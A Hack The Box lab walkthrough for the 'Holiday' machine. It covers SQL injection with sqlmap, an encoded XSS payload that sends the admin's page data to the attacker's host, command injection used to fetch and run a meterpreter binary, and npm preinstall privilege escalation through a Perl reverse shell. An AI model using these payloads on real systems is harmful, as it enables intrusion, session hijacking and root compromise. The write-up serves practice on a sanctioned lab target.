# Holiday -- hack the box

![EvqqqH.png](https://s2.ax1x.com/2019/05/20/EvqqqH.png)

## Introduction

Target: 10.10.10.25(Linux)

Kali: 10.10.16.65

Holiday is a insane box officially. It's really difficult to get the user permission. The most difficult part should be how to pass xss filter. It may need a lot of time. And the root privesc is based on the exploitation of npm install which is relatively fresh.

## Information enumeration

As usual, use nmap to detect open ports and related services: `nmap -A 10.10.10.25`:

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-19 09:49 GMT
Nmap scan report for htb.holiday (10.10.10.25)
Host is up (0.67s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c3:aa:3d:bd:0e:01:46:c9:6b:46:73:f3:d1:ba:ce:f2 (RSA)
|   256 b5:67:f5:eb:8d:11:e9:0f:dd:f4:52:25:9f:b1:2f:23 (ECDSA)
|_  256 79:e9:78:96:c5:a8:f4:02:83:90:58:3f:e5:8d:fa:98 (ED25519)
8000/tcp open  http    Node.js Express framework
|_http-title: Error
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=5/19%OT=22%CT=1%CU=38324%PV=Y%DS=2%DC=T%G=Y%TM=5CE126E
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST1
OS:1NW7%O6=M54BST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   630.30 ms 10.10.16.1
2   322.47 ms htb.holiday (10.10.10.25)
```

There are only two ports open. The port 8000 is a HTTP service which is hosted by Express. It should be our breakthrough.

## Exploitaion

Access to `http://10.10.10.25:8000`, there is nothing except a image. Download the image, and try to see more information about the image with exiftoo. Nothing interesting found.

[![EjY0mV.png](https://s2.ax1x.com/2019/05/19/EjY0mV.png)](https://imgchr.com/i/EjY0mV)

Then try to brute force the direcory. Gobuster and dirbuster seem not to be very useful for this box. If you try dirb, you will soon find some important directories, including: admin, login. Try to access `http://10.10.10.25:8000/login`. It is a login web page. Try to login with some default credentials. Not work. Then use burp to save the login request to a file.

```
POST /login HTTP/1.1
Host: 10.10.10.25:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.25:8000/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

### Sqlmap

Try to use sqlmap to brute force the login request. Due to the awful network or something, sqlmap is slow for me to use for the boxed in hack the box. So try to prefer get some important inpotant information instead of dump all information in sqlmap. For example, obtain tables firstly. Then dig into the interesting table.

```
sqlmap -r sql.req --level=5 --risk=3 --tables --threads=5
```

[![Ejdcss.md.png](https://s2.ax1x.com/2019/05/19/Ejdcss.md.png)](https://imgchr.com/i/Ejdcss)

By sqlmap, it seems that the database is SQLite and there are 5 tables. The `users` table is interesting. There may are some valid user and password. 

```
sqlmap -r sql.req --level=5 --risk=4 -T users --threads=10
```

![Ej4acR.png](https://s2.ax1x.com/2019/05/19/Ej4acR.png)

A user is found. [Hashkiller](https://hashkiller.co.uk/Cracker) is a wonderful hash crack online tool. The hash can be cracked easily.

![Ej464e.png](https://s2.ax1x.com/2019/05/19/Ej464e.png)

Login with this user. It seems to be a booking website.

![Ej4Lgs.png](https://s2.ax1x.com/2019/05/19/Ej4Lgs.png)

Click any booking and see the booking details. It consits of two tabs, including View and Notes. In the Notes, one word is interesting: "All notes must be approved by an administrator - this process can take up to 1 minute." Administrator is always attractive to hackers. It seems that the note will be approved by administrator. So it's possible to steal the session cokie of administrator if there is a xss vulnerability in the note edit form. I think it's the hardest part of this box. It's not easy to find the approprivate pass way. There is a way to utilize `fromCharCode` and other skills to pass the xss filter. The following javascript code is utilized to generate the payload:

![notes](https://s2.ax1x.com/2019/05/19/Ej4oE8.png)

```javascript
var url = 'http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65';
var str = `$.ajax({method:'GET',url:'${url}',success:function(data){$.post('http://10.10.16.65',data)}})`;
console.log(str);
result = "";
for (var i = 0; i < str.length; i++) {
  result += str.charCodeAt(i) + ',';
}
result = result.substr(0, result.length - 1);
console.log(result);
var payload = `<img src="x/><script>eval(String.fromCharCode(${result}));</script>">`;
console.log(payload);
```
![Ejv2od.png](https://s2.ax1x.com/2019/05/19/Ejv2od.png)

Set kali listen to port 80: `nc -lvnp 80`. The code can be run in the chrome dev. Input the generated payload into the note, wait a minute the data will be sent to kali. 

![Ej5nUO.png](https://s2.ax1x.com/2019/05/19/Ej5nUO.png)

The cookie of the administrator is obtained which is html encoded. Decode it with burp. And chage the cookie in the storage of firefox. Refesh the web page. Now you can hijack the administrator session cookie. Access to `http://10.10.10.25:8000/admin`. There seems nothing special except two buttons, including: Booking and Notes. 

![EjjOxK.png](https://s2.ax1x.com/2019/05/19/EjjOxK.png)

After some exploration, you will find that there are command injection in the two function url. You can try to access `http://10.10.10.25:8000/admin/export?table=notes%26ls`. You can found the directories in the exported file. One thing should be noticed, as `&` has been prohibited. So you can pass this by `%26`. Hence, it seems that the table name exits RCE. But it's limited to charaters, numbers and `/`. So you should try to RCE by these. It's not possible to use command to obtain reverse shell by command. For example, `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`. As many characters is not allowed.

![Ev7Txg.png](https://s2.ax1x.com/2019/05/20/Ev7Txg.png)

Utilize msfvenom to generate the payload:

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.16.65 LPORT=1234 -f elf > shell
```

Then upload the shell to the victim and execute it. As you are not allowed to use `.`. So convert IP address to decimal by [this website](https://www.ipaddressguide.com/ip). Access the following urls to execute the corresponding commands:

* upload shell: `http://10.10.10.25:8000/admin/export?table=notes%26cd%20/tmp%20%26%26wget%20168431681/shell`
* change permission: `http://10.10.10.25:8000/admin/export?table=notes%26chmod%20777%20/tmp/shell`
* execute shell: `http://10.10.10.25:8000/admin/export?table=notes%26cd%20/tmp/shell`

Before running the shell, you should set meterpreter in Kaili.

```
use exploit/multi/handler
set LHOST 10.10.16.65
set LPORT 1234
set payload linux/x86/meterpreter/reverse_tcp
run
```

Then, we get the shell!

![Evb1cF.png](https://s2.ax1x.com/2019/05/20/Evb1cF.png)

![EvbGnJ.png](https://s2.ax1x.com/2019/05/20/EvbGnJ.png)

## Privilege escalation

Check the sudo premission firstly: `sudo -l`. You will find the user has the permission to execute `sudo npm i`. [rimrafall](https://github.com/joaojeronimo/rimrafall) this repository has describle that npm install may be dangerous. It can be utilized to execute commands. You can upload the directory to the victim or create one by yourself.

```
cd app
mkdir rimrafall
cd rimrafall
echo "module.exports = "install my be dangerousr"" > index.js
```

Create the `package.json` and upload it to the target directory. `preinstall` can be utilized to execute command. I have found that some command to obtain reverse shell is not useful. As perl is install in the machine. And create a file called prel3 to obtain the reverse shell.

```

{
  "name": "rimrafall",
  "version": "1.0.0",
  "description": "rm -rf /* # DO NOT INSTALL THIS",
  "main": "index.js",
  "scripts": {
    "preinstall": "perl prel3"
  },
  "keywords": [
    "rimraf",
    "rmrf"
  ],
  "author": "João Jerónimo",
  "license": "ISC"
}
```

```
#prel3
use Socket;$i="10.10.16.65";$p=3344;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
```

Set kali listen to port 3344: `nc -lvnp 3344`. In the victim, execute by: `sudo npm i rimrafall`. Now, we are root!

![EvqfaR.png](https://s2.ax1x.com/2019/05/20/EvqfaR.png)





